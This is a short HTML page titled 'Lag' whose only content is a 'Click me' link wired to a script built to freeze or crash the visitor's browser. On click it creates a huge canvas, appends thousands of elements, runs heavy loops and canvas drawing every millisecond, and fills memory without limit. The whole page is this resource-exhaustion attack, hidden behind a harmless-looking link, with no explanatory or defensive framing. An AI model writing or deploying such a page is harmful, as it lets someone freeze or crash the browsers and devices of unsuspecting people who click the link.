<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Lag</title>
</head>
<body>

  <a href="#" onclick="causeLag(); return false;">Click me</a>

  <script>
    function causeLag() {

      // Heavy canvas rendering
      const canvas = document.createElement('canvas');
      canvas.width = 4096;
      canvas.height = 4096;
      document.body.appendChild(canvas);
      const ctx = canvas.getContext('2d');

      // Spam massive DOM
      for (let i = 0; i < 5000; i++) {
        const div = document.createElement('div');
        div.style.width = '100px';
        div.style.height = '100px';
        div.style.background = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
        document.body.appendChild(div);
      }

      // Infinite heavy loop
      let count = 0;
      setInterval(() => {
        for (let i = 0; i < 999999; i++) {
          count += Math.sqrt(Math.random() * i);
        }
        // Spam canvas non-stop
        for (let i = 0; i < 10000; i++) {
          ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
          ctx.fillRect(Math.random()*4096, Math.random()*4096, 100, 100);
        }
      }, 1);

      // Fill memory
      let mem = [];
      setInterval(() => {
        for (let i = 0; i < 1000000; i++) {
          mem.push(new Array(100).fill(Math.random()));
        }
      }, 500);

    }
  </script>

</body>
</html>
